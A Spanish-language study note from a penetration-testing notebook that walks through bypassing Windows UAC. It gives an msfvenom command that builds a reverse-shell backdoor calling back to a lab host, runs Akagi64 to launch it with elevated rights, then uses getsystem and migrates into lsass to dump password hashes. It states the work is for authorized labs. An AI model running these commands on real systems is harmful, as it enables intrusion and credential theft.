---
title: "3 - UAC Bypass"
date: 2026-08-27
tags:
  - self-study
  - security-penetration-testing
  - avanzado
status: verified
author: "Juan José Restrepo Rosero"
last_updated: 2026-08-27
---

Supongamos que estamos dentro de una sesión de meterpreter de una máquina Windows:
![[Pasted image 20230731085818.png]]
Y queremos ejecutar el comando getsystem, donde veremos que nos da error porque ha saltado el UAC:
![[Pasted image 20230731085852.png]]
Por tanto, el primer paso será generar el payload con msfvenom en formato .exe, para pasárselo a la herramienta que usaremos más tarde:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.3 LPORT=4444 -f exe > 'backdoor.exe'
```
![[Pasted image 20230731090017.png]]
Y ahora subimos este payload como también la herramienta para hacer el bypass llamada Akagi64.exe, ubicándonos en /temp porque allí tenemos permisos de escritura:
![[Pasted image 20230731092903.png]]
![[Pasted image 20230731090056.png]]
Una vez hecho esto, nos pondremos otra vez en escucha con metasploit para recibir esta nueva conexión:
![[Pasted image 20230731090306.png]]
Y ahora desde la otra sesión de meterpreter, ejecutamos el Akagi64.exe pasándole la backdoor.exe que hemos subido anteriormente:
```bash
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
```
Recibimos la conexión y ahora sí podemos ejecutar el comando getsystem:
![[Pasted image 20230731090426.png]]
Y también podemos migrarnos al proceso lsass.exe para dumpear hashes:
![[Pasted image 20230731090942.png]]
![[Pasted image 20230731090952.png]]

<!-- self-study-knowledge-context -->
## Contexto de estudio
- Dominio: [[MOC-Self-Study#Security & Penetration Testing|Seguridad y pruebas de penetración]].
- Criterio de producción: Ejecuta técnicas únicamente en activos propios o con autorización explícita, alcance documentado y controles de no afectación.
> [!warning] Uso autorizado
> Este material es exclusivamente educativo y defensivo. Practica en laboratorios aislados, CTFs o sistemas para los que dispongas de autorización previa y explícita.
